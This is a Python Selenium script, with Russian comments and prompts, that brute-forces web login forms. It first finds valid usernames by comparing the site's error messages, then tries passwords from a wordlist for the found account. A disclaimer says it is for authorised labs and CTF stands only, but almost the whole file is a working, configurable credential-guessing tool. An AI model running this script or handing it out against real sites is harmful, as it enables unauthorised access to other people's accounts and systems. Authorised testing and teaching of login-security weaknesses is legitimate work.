from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException, StaleElementReferenceException,
    NoSuchWindowException, InvalidSessionIdException,
)
import time
import sys


# ============================================================
#  ПРЕДУПРЕЖДЕНИЕ
# ============================================================
def show_disclaimer():
    print("=" * 70)
    print("  ВНИМАНИЕ!")
    print("=" * 70)
    print("""
  Этот скрипт предназначен ИСКЛЮЧИТЕЛЬНО для использования
  на СОБСТВЕННЫХ или ОФИЦИАЛЬНО РАЗРЕШЁННЫХ тестовых стендах
  (например, учебных стендах преподавателя, CTF-площадках,
  локальных лабораториях).

  Использование для подбора паролей к чужим системам без
  письменного разрешения владельца является НЕЗАКОННЫМ
  и преследуется по закону (ст. 272 УК РФ и аналоги в других
  странах).

  Автор скрипта НЕ НЕСЁТ ОТВЕТСТВЕННОСТИ за любое незаконное
  или неэтичное использование. Запуская скрипт, вы подтверждаете,
  что у вас есть разрешение на тестирование целевой системы.
""")
    print("=" * 70)

    answer = input("Продолжить? (yes/no): ").strip().lower()
    if answer not in ("yes", "y", "да", "д"):
        print("Отменено пользователем.")
        sys.exit(0)


# ============================================================
#  ИНТЕРАКТИВНАЯ НАСТРОЙКА
# ============================================================
def ask(prompt, default=None, required=True):
    """Запрашивает значение, возвращает default если пусто."""
    suffix = f" [{default}]" if default else ""
    while True:
        value = input(f"{prompt}{suffix}: ").strip()
        if value:
            return value
        if default is not None:
            return default
        if not required:
            return ""
        print("  ⚠ Поле обязательно для заполнения.")


def configure():
    """Собирает все параметры стенда через ввод пользователя."""
    print("\n" + "=" * 70)
    print("  НАСТРОЙКА ПАРАМЕТРОВ СТЕНДА")
    print("=" * 70)
    print("  (Enter — использовать значение по умолчанию, если оно есть)\n")

    cfg = {}

    # --- адрес и поля ---
    cfg["url"] = ask("URL страницы входа")
    cfg["login_id"] = ask("ID поля логина", default="login-email-address")
    cfg["password_id"] = ask("ID поля пароля", default="login-password")
    cfg["error_id"] = ask("ID элемента с сообщением об ошибке", default="auth_error")

    # --- тексты ошибок ---
    print("\n--- Тексты сообщений об ошибке ---")
    cfg["error_login_text"] = ask(
        "Текст ошибки при неверном логине",
        default="Не найдено ни одного пользователя с данным логином",
    )
    cfg["error_password_text"] = ask(
        "Текст ошибки при неверном пароле",
        default="Неверный пароль",
    )

    # --- как понять, что вход успешен ---
    print("\n--- Признак успешного входа ---")
    print("  1) форма входа исчезает / редирект")
    print("  2) появляется элемент, которого нет на странице логина")
    cfg["success_mode"] = ask("Выберите (1/2)", default="1")

    if cfg["success_mode"] == "2":
        cfg["success_id"] = ask("ID элемента, который есть ТОЛЬКО после входа")

    # --- файлы со списками ---
    print("\n--- Файлы со списками ---")
    cfg["logins_file"] = ask("Файл с логинами", default="logins.txt")
    cfg["passwords_file"] = ask("Файл с паролями", default="world_passwords.txt")

    # --- задержка ---
    cfg["delay"] = float(ask("Задержка между попытками, сек", default="0.5"))

    return cfg


def load_lines(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"  ⚠ Файл '{filename}' не найден. Список пуст.")
        return []


# ============================================================
#  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================
def window_alive(driver):
    try:
        return len(driver.window_handles) > 0
    except Exception:
        return False


def element_visible(driver, element_id):
    els = driver.find_elements(By.ID, element_id)
    return any(e.is_displayed() for e in els)


def get_error_text(driver, error_id):
    els = driver.find_elements(By.ID, error_id)
    for e in els:
        if e.is_displayed():
            return e.text.strip()
    return None


# ============================================================
#  ОСНОВНАЯ ЛОГИКА
# ============================================================
def brute_force_login(driver, wait, cfg, login_candidates):
    """Возвращает найденный логин или None."""
    for login in login_candidates:
        if not window_alive(driver):
            print("[?] Окно закрылось во время подбора логина")
            return None
        try:
            login_input = wait.until(
                EC.element_to_be_clickable((By.ID, cfg["login_id"]))
            )
            login_input.clear()
            login_input.send_keys(login)
            login_input.send_keys(Keys.ENTER)

            time.sleep(cfg["delay"])

            err = get_error_text(driver, cfg["error_id"])
            if err is None:
                print(f"[+] Логин принят: {login}")
                return login
            if err == cfg["error_login_text"]:
                continue
            print(f"[+] Логин существует: {login} (ошибка: '{err}')")
            return login

        except StaleElementReferenceException:
            continue
        except TimeoutException:
            continue
        except (NoSuchWindowException, InvalidSessionIdException):
            print(f"[?] Окно/сессия закрылись на логине '{login}'")
            return None
    return None


def is_password_success(driver, cfg):
    """True, если пароль верный."""
    if cfg["success_mode"] == "2":
        return element_visible(driver, cfg.get("success_id", ""))

    # режим 1: успех = нет ошибки auth_error
    return not element_visible(driver, cfg["error_id"])


def brute_force_password(driver, wait, cfg, login, password_candidates):
    """Возвращает найденный пароль или None."""
    for passw in password_candidates:
        if not window_alive(driver):
            print(f"[?] Окно закрылось на '{passw}' — вероятно, вход успешен")
            return passw
        try:
            login_input = wait.until(
                EC.element_to_be_clickable((By.ID, cfg["login_id"]))
            )
            password_input = wait.until(
                EC.element_to_be_clickable((By.ID, cfg["password_id"]))
            )

            login_input.clear()
            login_input.send_keys(login)
            password_input.clear()
            password_input.send_keys(passw)
            password_input.send_keys(Keys.ENTER)

            time.sleep(cfg["delay"])

            if is_password_success(driver, cfg):
                print(f"[+] Пароль найден: {passw}")
                return passw

        except StaleElementReferenceException:
            continue
        except TimeoutException:
            continue
        except (NoSuchWindowException, InvalidSessionIdException):
            print(f"[?] Окно/сессия закрылись на '{passw}' — вероятно, вход успешен")
            return passw
    return None


# ============================================================
#  ТОЧКА ВХОДА
# ============================================================
def main():
    show_disclaimer()
    cfg = configure()

    logins = load_lines(cfg["logins_file"])
    passwords = load_lines(cfg["passwords_file"])
    if not logins:
        print("[-] Список логинов пуст — нечего перебирать.")
        return
    if not passwords:
        print("[-] Список паролей пуст — нечего перебирать.")
        return

    print(f"\n[*] Логинов: {len(logins)}, паролей: {len(passwords)}")

    driver = webdriver.Chrome()
    try:
        driver.get(cfg["url"])
        driver.maximize_window()
        wait = WebDriverWait(driver, 10)

        print("\n[*] Подбираем логин...")
        login = brute_force_login(driver, wait, cfg, logins)
        if not login:
            print("[-] Логин не найден")
            return

        print(f"[*] Подбираем пароль для '{login}'...")
        passw = brute_force_password(driver, wait, cfg, login, passwords)

        print("\n" + "=" * 70)
        if passw:
            print(f"  УСПЕХ!")
            print(f"  Логин:  {login}")
            print(f"  Пароль: {passw}")
        else:
            print("  Пароль не найден среди кандидатов")
        print("=" * 70)

        input("\nEnter, чтобы закрыть браузер...")
    finally:
        driver.quit()


if __name__ == "__main__":
    main()